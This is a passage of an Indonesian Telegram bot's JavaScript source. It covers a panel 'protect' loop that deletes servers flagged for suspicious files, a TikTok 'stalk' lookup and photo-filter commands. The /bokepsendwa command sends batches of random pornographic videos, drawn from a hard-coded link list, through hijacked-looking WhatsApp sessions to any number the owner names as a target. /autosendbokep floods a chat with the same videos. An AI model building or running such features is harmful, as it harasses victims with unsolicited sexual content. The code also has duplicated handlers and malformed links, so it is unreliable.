      if (cpu >= CPU_THRESHOLD_PERCENT) PROTECT_cpuStrike[cooldownKey] += 1;
      else PROTECT_cpuStrike[cooldownKey] = 0;

      let suspiciousFiles = [];
      try {
        const files = await PROTECT_filesWalk(domain, clientKey, sid, '/', 0, FILE_SCAN_DEPTH);
        for (const f of files) {
          const lname = (f.name || '').toLowerCase();
          
          if (lname.includes('scarrydeath.js')) continue;

          if (SAFE_FILES.includes(f.name)) continue;
          
          if (SUSPICIOUS_KEYWORDS.some(k => lname.includes(k))) {
            suspiciousFiles.push(f.path);
            continue;
          }
          if (/\.(sh|js|py|php|pl|rb|exe|bin)$/.test(lname)) {
            const content = await PROTECT_tryReadFile(domain, clientKey, sid, f.path);
            if (content && SUSPICIOUS_KEYWORDS.some(k => content.toLowerCase().includes(k))) {
              suspiciousFiles.push(f.path);
            }
          }
        }
      } catch (e) {
      }

      const cpuTriggered = PROTECT_cpuStrike[cooldownKey] >= CPU_STRIKE_LIMIT;
      const triggered = cpuTriggered || suspiciousFiles.length > 0;

      if (triggered) {
        const srvDetails = await PROTECT_getServerDetails(domain, adminKey, sid);
        const notifyName = (srvDetails?.name) || sName || (srvEntry.name || 'Unknown');

        const notifMsg = [
          '🔥 *AGGRESSIVE PROTECT TRIGGER*',
          `🌐 Panel: ${domain}`,
          `📌 Server: *${notifyName}*`,
          `🆔 ID: \`${sid}\``,
          `⚠ CPU: ${cpu}%`,
          `⚠ Suspicious files: ${suspiciousFiles.length}`,
          `➡ Action: delete suspicious files + delete server (Pterodactyl).`
        ].join('\n');

        await PROTECT_notifyOwners(notifMsg);

        if (suspiciousFiles.length > 0) {
          try {
            await PROTECT_deleteFiles(domain, clientKey, sid, suspiciousFiles);
          } catch (e) { }
        }

        try {
          await PROTECT_deleteServer(domain, adminKey, sid);
        } catch (e) { }

        await PROTECT_notifyOwners(`✅ Action completed for server *${notifyName}* (ID: \`${sid}\`) on panel ${domain}`);

        PROTECT_lastAction[cooldownKey] = Date.now();
        PROTECT_cpuStrike[cooldownKey] = 0;

        try {
          const ps = readPanelServers();
          if (ps[domain]) {
            ps[domain] = ps[domain].filter(x => x.id !== sid);
            writePanelServers(ps);
          }
        } catch (e) {}
      }
    }
  }

  setTimeout(PROTECT_mainLoop, PROTECT_POLL_INTERVAL);
}

bot.onText(/\/connectpanel (.+)/, async (msg, match) => {
  const fromId = String(msg.from.id);
  if (!isOwner(fromId)) return bot.sendMessage(msg.chat.id, '❌ Hanya owner bisa melakukan ini.');

  const raw = match[1].trim();
  let domain, plta, pltc;
  if (raw.includes(',')) {
    [domain, plta, pltc] = raw.split(',').map(s => s.trim());
  } else {
    const parts = raw.split(/\s+/);
    domain = parts[0]; plta = parts[1]; pltc = parts[2];
  }
  if (!domain || !plta || !pltc) return bot.sendMessage(msg.chat.id, 'Format: /connectpanel url plta pltc');

  const panels = readPanels();
  if (panels.some(p => p.domain === domain)) return bot.sendMessage(msg.chat.id, '⚠️ Panel sudah terdaftar!');

  panels.push({ domain, plta, pltc });
  writePanels(panels);

  const ps = readPanelServers();
  if (!ps[domain]) ps[domain] = [];
  writePanelServers(ps);

  bot.sendMessage(msg.chat.id, `✅ Panel ditambahkan: ${domain}`);
  await PROTECT_notifyOwners(`🟢 *Panel Terhubung untuk Proteksi*\n${domain}`);
});

bot.onText(/\/delpanelprotect (.+)/, async (msg, match) => {
  const fromId = String(msg.from.id);
  if (!isOwner(fromId)) return bot.sendMessage(msg.chat.id, '❌ Hanya owner.');

  const domain = match[1].trim();
  let panels = readPanels();
  const newPanels = panels.filter(p => p.domain !== domain);
  if (newPanels.length === panels.length) return bot.sendMessage(msg.chat.id, '⚠️ Panel tidak ditemukan.');

  writePanels(newPanels);

  const ps = readPanelServers();
  if (ps[domain]) { delete ps[domain]; writePanelServers(ps); }

  bot.sendMessage(msg.chat.id, `🗑️ Panel dihapus dari proteksi: ${domain}`);
  await PROTECT_notifyOwners(`🔴 *Panel Dihapus dari Proteksi*\n${domain}`);
});

bot.onText(/\/listpanelprotect$/, async (msg) => {
  const fromId = String(msg.from.id);
  if (!isOwner(fromId)) return bot.sendMessage(msg.chat.id, '❌ Hanya owner.');

  const panels = readPanels();
  if (!panels || panels.length === 0) return bot.sendMessage(msg.chat.id, '📛 Tidak ada panel terdaftar.');

  const lines = [];
  for (const p of panels) {
    let status = '🔴 Mati';
    try {
      const r = await axios.get(`${p.domain.replace(/\/+$/, '')}/api/application/servers?page=1&per_page=1`, { headers: { Authorization: `Bearer ${p.plta}`, Accept: 'application/json' }, timeout: 6000 });
      if (r && Array.isArray(r.data?.data)) status = '🟢 Aktif';
    } catch (e) {
      status = '🔴 Mati';
    }
    lines.push(`• ${p.domain} — ${status}`);
  }

  const text = '*Daftar Panel Terproteksi*\n\n' + lines.join('\n');
  bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

function isOwner(idStr) {
  try {
    if (!config.OWNER_ID) return false;
    if (Array.isArray(config.OWNER_ID)) return config.OWNER_ID.map(String).includes(String(idStr));
    return String(config.OWNER_ID) === String(idStr);
  } catch { return false; }
}

setTimeout(PROTECT_mainLoop, 2 * 1000);

// Command: /playstore free fire
bot.onText(/\/playstore (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    const url = `https://api.siputzx.my.id/api/apk/playstore?query=${encodeURIComponent(query)}`;
    const { data } = await axios.get(url);

    if (!data.status || !data.data || data.data.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada hasil ditemukan.");
    }

    // hanya ambil 1 hasil saja
    const app = data.data[0];

    const caption =
`📱 *${app.nama}*
👤 Developer: *${app.developer}*
⭐ Rating: *${app.rate2} / 5*
🔗 Link: ${app.link}
🏬 Dev Page: ${app.link_dev}`;

    // kirim foto + caption
    await bot.sendPhoto(chatId, app.img, {
      caption,
      parse_mode: "Markdown"
    });

  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Terjadi error, coba lagi nanti.");
    console.log("Error Playstore:", err.message);
  }
});

bot.onText(/\/apkmod (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const query = match[1];

    try {
        // Ambil dari API kamu
        const res = await axios.get(`https://api.siputzx.my.id/api/apk/apkmody?search=${encodeURIComponent(query)}`);
        const data = res.data.data;

        if (!data || data.length === 0) {
            return bot.sendMessage(chatId, "Tidak ada hasil ditemukan.");
        }

        // Ambil hanya item pertama
        const item = data[0];

        const caption =
`*${item.title}*
Versi: \`${item.version}\`
Genre: \`${item.genre}\`
Fitur: \`${item.features || "-"}\`
Rating: ⭐ ${item.rating.stars} (${item.rating.percentage}%)
`;

        const buttons = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔗 Buka Link", url: item.link }]
                ]
            },
            parse_mode: "Markdown"
        };

        await bot.sendPhoto(
            chatId,
            item.icon, // FOTO icon
            {
                caption: caption,
                ...buttons
            }
        );

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "⚠ Terjadi kesalahan, coba lagi nanti.");
    }
});

const videoListWA = [
 "https://files.catbox.moe/3yko44.mp4",
"https://files.catbox.moe/ebisdh.mp4",
"https://files.catbox.moe/85mjwm.mp4",
"https://files.catbox.moe/fxe94h.mp4",
"https://files.catbox.moe/xlbafn.mp4",
"https://files.catbox.moe/eti8qi.mp4",
"https://files.catbox.moe/0728bg.mp4",
"https://files.catbox.moe/6bkokw.mp4",
"https://files.catbox.moe/y4rote.mp4",
"https://files.catbox.moe/svw26n.mp4",
"https://files.catbox.moe/tw6m9q.mp4",
"https://files.catbox.moe/o1ipxw.mp4",
"https://files.catbox.moe/wqe1r7.mp4",
"https://files.catbox.moe/b99qh3.mp4",
"https://files.catbox.moe/o1sq2k.mp4",
"https://files.catbox.moe/zqaszb.mp4",
"https://files.catbox.moe/apqlvo.mp4",
"https://files.catbox.moe/cdl11t.mp4",
"https://files.catbox.moe/jdopgq.mp4",
"https://files.catbox.moe/jdopgq.mp4",
"https://files.catbox.moe/8ca9cw.mp4",
"https://files.catbox.moe/52oh63.mp4",
"https://files.catbox.moe/rt62tl.mp4",
"https://files.catbox.moe/occ3en.mp4",
"https://files.catbox.moe/8c7gz3.mp4",
"https://files.catbox.moe/wqe1r7.mp4",
"https://files.catbox.moe/h2w5jl.mp4",
"https://files.catbox.moe/dmbizk.mp4",
"https://files.catbox.moe/3288uf.mp4",
"https://files.catbox.moe/rdggsh.mp4",
"https://files.catbox.moe/1a78ht.mp4",
"https://files.catbox.moe/a537h1.mp4",
"https://files.catbox.moe/n992te.mp4",
"https://files.catbox.moe/gv4087.mp4",
"https://files.catbox.moe/n37liq.mp4",
"https://files.catbox.moe/3g2djb.mp4",
"https://files.catbox.moe/q9f2rs.mp4",
"https://files.catbox.moe/4x09p9.mp4",
"https://files.catbox.moe/83fd5h.mp4",
"https://files.catbox.moe/6di4hn.mp4",
"https://files.catbox.moe/dxn5oj.mp40",
"https://files.catbox.moe/ltdsbm.mp4",
"https://files.catbox.moe/71l6bo.mp4",
"https://files.catbox.moe/uw6qbs.mp40",
"https://files.catbox.moe/0eisok.mp4",
"https://files.catbox.moe/r3ip1j.mp4",
"https://files.catbox.moe/pmyi1y.mp4",
"https://files.catbox.moe/8c7gz3.mp4",
"https://files.catbox.moe/y8hmau.mp4",
"https://files.catbox.moe/wmda7z.mp4",
"https://files.catbox.moe/iajl3r.mp4",
"https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
];

bot.onText(/\/bokepsendwa (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const number = match[1];
    const jumlah = parseInt(match[2]);
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, "Fitur ini hanya untuk owner.");
    }

    if (!sessions.has(number)) {
        return bot.sendMessage(chatId, "❌ Session WA tidak ditemukan / belum aktif.");
    }

    const sock = sessions.get(number);

    if (videoListWA.length === 0) {
        return bot.sendMessage(chatId, "❌ List video kosong!");
    }

    await bot.sendMessage(chatId, `Mengirim ${jumlah} video bokep ke WhatsApp ${number}... ⌛`);

    const jid = number + "@s.whatsapp.net";

    for (let i = 0; i < jumlah; i++) {
        try {
            const randomVideo = videoListWA[Math.floor(Math.random() * videoListWA.length)];

            const videoBuffer = await axios.get(randomVideo, {
                responseType: "arraybuffer"
            }).then(res => res.data);

            await sock.sendMessage(jid, {
                video: videoBuffer,
                caption: `Video bokep random ke-${i + 1}`
            });

            await new Promise(res => setTimeout(res, 1500)); // delay aman
        } catch (err) {
            console.log(err);
            await bot.sendMessage(chatId, `Gagal mengirim video bokep ke-${i + 1}`);
        }
    }

    bot.sendMessage(chatId, "Selesai mengirim semua video bokep ke WhatsApp target! ✅");
});

// Daftar link video random (tambah sendiri)
const gasssend = [
    "https://files.catbox.moe/3yko44.mp4",
"https://files.catbox.moe/ebisdh.mp4",
"https://files.catbox.moe/85mjwm.mp4",
"https://files.catbox.moe/fxe94h.mp4",
"https://files.catbox.moe/xlbafn.mp4",
"https://files.catbox.moe/eti8qi.mp4",
"https://files.catbox.moe/0728bg.mp4",
"https://files.catbox.moe/6bkokw.mp4",
"https://files.catbox.moe/y4rote.mp4",
"https://files.catbox.moe/svw26n.mp4",
"https://files.catbox.moe/tw6m9q.mp4",
"https://files.catbox.moe/o1ipxw.mp4",
"https://files.catbox.moe/wqe1r7.mp4",
"https://files.catbox.moe/b99qh3.mp4",
"https://files.catbox.moe/o1sq2k.mp4",
"https://files.catbox.moe/zqaszb.mp4",
"https://files.catbox.moe/apqlvo.mp4",
"https://files.catbox.moe/cdl11t.mp4",
"https://files.catbox.moe/jdopgq.mp4",
"https://files.catbox.moe/jdopgq.mp4",
"https://files.catbox.moe/8ca9cw.mp4",
"https://files.catbox.moe/52oh63.mp4",
"https://files.catbox.moe/rt62tl.mp4",
"https://files.catbox.moe/occ3en.mp4",
"https://files.catbox.moe/8c7gz3.mp4",
"https://files.catbox.moe/wqe1r7.mp4",
"https://files.catbox.moe/h2w5jl.mp4",
"https://files.catbox.moe/dmbizk.mp4",
"https://files.catbox.moe/3288uf.mp4",
"https://files.catbox.moe/rdggsh.mp4",
"https://files.catbox.moe/1a78ht.mp4",
"https://files.catbox.moe/a537h1.mp4",
"https://files.catbox.moe/n992te.mp4",
"https://files.catbox.moe/gv4087.mp4",
"https://files.catbox.moe/n37liq.mp4",
"https://files.catbox.moe/3g2djb.mp4",
"https://files.catbox.moe/q9f2rs.mp4",
"https://files.catbox.moe/4x09p9.mp4",
"https://files.catbox.moe/83fd5h.mp4",
"https://files.catbox.moe/6di4hn.mp4",
"https://files.catbox.moe/dxn5oj.mp40",
"https://files.catbox.moe/ltdsbm.mp4",
"https://files.catbox.moe/71l6bo.mp4",
"https://files.catbox.moe/uw6qbs.mp40",
"https://files.catbox.moe/0eisok.mp4",
"https://files.catbox.moe/r3ip1j.mp4",
"https://files.catbox.moe/pmyi1y.mp4",
"https://files.catbox.moe/8c7gz3.mp4",
"https://files.catbox.moe/y8hmau.mp4",
"https://files.catbox.moe/wmda7z.mp4",
"https://files.catbox.moe/iajl3r.mp4",
"https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
];

bot.onText(/\/autosendbokep (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const jumlah = parseInt(match[1]);

    if (isNaN(jumlah) || jumlah <= 0) {
        return bot.sendMessage(chatId, "Format salah!\nContoh: /autosendbokep 30");
    }

    await bot.sendMessage(chatId, `Mengirim ${jumlah} video bokep acak... ⌛`);

    for (let i = 0; i < jumlah; i++) {
        try {
            // Ambil video random dari list
            const randomVideo = gasssend[Math.floor(Math.random() * gasssend.length)];

            if (!randomVideo) {
                await bot.sendMessage(chatId, "List video kosong! ❌");
                continue;
            }

            await bot.sendVideo(chatId, randomVideo, {
                caption: `Video bokep random ke-${i + 1}`
            });

            // Delay aman agar tidak flood
            await new Promise(res => setTimeout(res, 3000));

        } catch (err) {
            console.log(err);
            await bot.sendMessage(chatId, `Gagal mengirim video ke-${i + 1}`);
        }
    }

    bot.sendMessage(chatId, "Selesai mengirim semua video bokep! ✅");
});

bot.onText(/^\/akuntt (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1];

  bot.sendMessage(chatId, `🔍 Mengambil data TikTok *@${username}*...`);

  try {
    const url = `https://api-faa.my.id/faa/tiktokstalk?username=${username}`;
    const res = await axios.get(url);

    if (!res.data.status) {
      return bot.sendMessage(chatId, "❌ Username tidak ditemukan!");
    }

    const r = res.data.result;

    const text = `
📌 *TikTok Stalk Result*

👤 *Name:* ${r.name || "-"}
🔖 *Username:* @${r.username}
🆔 *ID:* ${r.id}
🔗 *Link:* ${r.link}

📊 *Stats:*
• Followers: ${r.stats.followers}
• Following: ${r.stats.following}
• Likes: ${r.stats.likes}
• Videos: ${r.stats.videos}

📝 *Description:*  
${r.description || "-"}

🖼 *Avatar:* (lihat gambar di atas)
    `;

    // Kirim avatar + caption
    bot.sendPhoto(chatId, r.avatar, { caption: text, parse_mode: "Markdown" });

  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan, coba lagi nanti.");
    console.log(err);
  }
});

// ==========================
//  FITUR /tomekah
// ==========================
bot.onText(/\/tomekah/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🕋 *Kirim foto dengan membalas (reply) pesan ini — akan diubah menjadi gaya Mekah.*",
        { parse_mode: "Markdown" }
    );

    bot.tomekahAsk = ask.message_id;
});

// Saat user mengirim foto
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan reply ke pesan /tomekah
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tomekahAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto menjadi gaya Mekah...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tomekah?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        // Simpan sebagai file JPG agar anti error
        const tempPath = path.join(__dirname, "tomekah_result.jpg");
        fs.writeFileSync(tempPath, buffer);

        await bot.sendPhoto(chatId, tempPath, {
            caption: "🕋✨ Foto berhasil diubah menjadi *gaya Mekah*!",
            parse_mode: "Markdown"
        });

        fs.unlinkSync(tempPath);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    bot.tomekahAsk = null;
});

bot.onText(/\/toemotebatu/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "✨ *Kirim foto kamu dengan membalas (reply) pesan ini — akan diubah ke gaya Bersama Emote Batu.*",
        { parse_mode: "Markdown" }
    );

    bot.tomoaiAsk = ask.message_id;
});

// Saat user mengirim foto
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan reply ke pesan bot
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tomoaiAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto ke gaya Bersma Emote Batu...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tomoai?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        bot.sendPhoto(chatId, buffer, {
            caption: "✨ Foto berhasil diubah menjadi gaya Bersama Emote Batu"
        });

    } catch (err) {
        console.log(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    // Hapus state
    bot.tomoaiAsk = null;
});

bot.onText(/\/tohitam/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🎨 *Kirim foto kamu dengan membalas (reply) pesan ini — akan diubah menjadi versi hitam putih.*",
        { parse_mode: "Markdown" }
    );

    bot.tohitamAsk = ask.message_id;
});

// Saat user mengirim foto
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan reply ke pesan bot
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tohitamAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto menjadi hitam putih...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tohitam?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        bot.sendPhoto(chatId, buffer, {
            caption: "✨ Foto berhasil diubah menjadi hitam putih!"
        });

    } catch (err) {
        console.log(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    // Hapus state
    bot.tohitamAsk = null;
});

bot.onText(/\/tobotak/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🧑‍🦲 *Kirim foto kamu dengan membalas (reply) pesan ini*",
        { parse_mode: "Markdown" }
    );

    bot.tobotakAsk = ask.message_id;
});

// Saat user mengirim foto
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan bot
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tobotakAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto menjadi versi botak...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tobotak?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        bot.sendPhoto(chatId, buffer, {
            caption: "✨ Foto berhasil diubah menjadi versi botak!"
        });

    } catch (err) {
        console.log(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    // Hapus state
    bot.tobotakAsk = null;
});

bot.onText(/\/tohijab/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🧕 *Kirim foto wajah kamu dengan membalas (reply) pesan ini*",
        { parse_mode: "Markdown" }
    );

    bot.tohijabAsk = ask.message_id;
});

// Saat user mengirim foto
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan reply ke pesan bot
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tohijabAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto menjadi versi berhijab...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tohijab?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        bot.sendPhoto(chatId, buffer, {
            caption: "✨ Foto berhasil diubah menjadi versi berhijab!"
        });

    } catch (err) {
        console.log(err);
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    // Hapus state
    bot.tohijabAsk = null;
});

bot.onText(/\/tofigura/, async (msg) => {
    const chatId = msg.chat.id;

    const ask = await bot.sendMessage(
        chatId,
        "🖼️ *Kirim foto kamu dengan membalas (reply) pesan ini*",
        { parse_mode: "Markdown" }
    );

    bot.tofiguraAsk = ask.message_id;
});

// Saat user mengirim foto
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Pastikan ini reply ke pesan bot
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.tofiguraAsk) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    bot.sendMessage(chatId, "⏳ Mengubah foto menjadi figur 1/7...");

    try {
        const apiUrl = `https://api-faa.my.id/faa/tofigura?url=${encodeURIComponent(fileUrl)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        bot.sendPhoto(chatId, buffer, {
            caption: "✨ Foto berhasil diubah menjadi figur 1/7!"
        });

    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    // hapus state
    bot.tofiguraAsk = null;
});

// Mulai perintah
bot.onText(/\/tobersamav2/, async (msg) => {
    const chatId = msg.chat.id;

    const ask1 = await bot.sendMessage(
        chatId,
        "📸 *Kirim foto pertama dengan membalas (reply) pesan ini*",
        { parse_mode: "Markdown" }
    );

    bot.photo1Ask = ask1.message_id;
});

// Foto pertama
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // ————— Foto Pertama —————
    if (msg.reply_to_message && msg.reply_to_message.message_id === bot.photo1Ask) {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const fileUrl = await bot.getFileLink(fileId);

        bot.url1 = fileUrl;

        const ask2 = await bot.sendMessage(
            chatId,
            "📷 *Kirim foto kedua dengan membalas (reply) pesan ini*",
            { parse_mode: "Markdown" }
        );

        bot.photo2Ask = ask2.message_id;
        return;
    }

    // ————— Foto Kedua —————
    if (msg.reply_to_message && msg.reply_to_message.message_id === bot.photo2Ask) {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const fileUrl = await bot.getFileLink(fileId);

        bot.url2 = fileUrl;

        bot.sendMessage(chatId, "⏳ Sedang memproses kedua foto...");

        try {
            const apiUrl = `https://api-faa.my.id/faa/tobersamav2?url1=${encodeURIComponent(bot.url1)}&url2=${encodeURIComponent(fileUrl)}`;

            const response = await axios({
                url: apiUrl,
                responseType: "arraybuffer"
            });

            const buffer = Buffer.from(response.data, "binary");

            bot.sendPhoto(chatId, buffer, {
                caption: "✨ Foto ToBersama v2 berhasil dibuat!"
            });

        } catch (err) {
            bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses foto.");
        }

        // bersihkan state
        bot.photo1Ask = null;
        bot.photo2Ask = null;
        bot.url1 = null;
        bot.url2 = null;
    }
});

bot.onText(/\/fotbersamav1/, async (msg) => {
    const chatId = msg.chat.id;

    const askPhoto = await bot.sendMessage(
        chatId,
        "📸 *Kirim foto kamu dengan membalas (reply) pesan ini*",
        { parse_mode: "Markdown" }
    );

    // Simpan ID pesan agar nanti dicek reply-nya
    bot.lastAskPhoto = askPhoto.message_id;
});

// Saat user mengirim foto dengan reply
bot.on("photo", async (msg) => {
    const chatId = msg.chat.id;

    // Cek apakah foto adalah reply ke pesan bot
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.lastAskPhoto) return;

    const fileId = msg.photo[msg.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    // Bot minta nama artis
    const askArtis = await bot.sendMessage(
        chatId,
        "⭐ *Masukkan nama artis dengan membalas (reply) pesan ini*\nContoh: `lisa blackpink`",
        { parse_mode: "Markdown" }
    );

    bot.lastAskArtis = askArtis.message_id;
    bot.userPhotoUrl = fileUrl;
});

// Saat user membalas nama artis
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;

    // Cek reply teks nama artis
    if (!msg.reply_to_message || msg.reply_to_message.message_id !== bot.lastAskArtis) return;
    if (!msg.text || msg.text.startsWith("/")) return;

    const artist = msg.text;
    const photoUrl = bot.userPhotoUrl;

    bot.sendMessage(chatId, `⏳ Sedang memproses foto bersama *${artist}*...`, {
        parse_mode: "Markdown"
    });

    try {
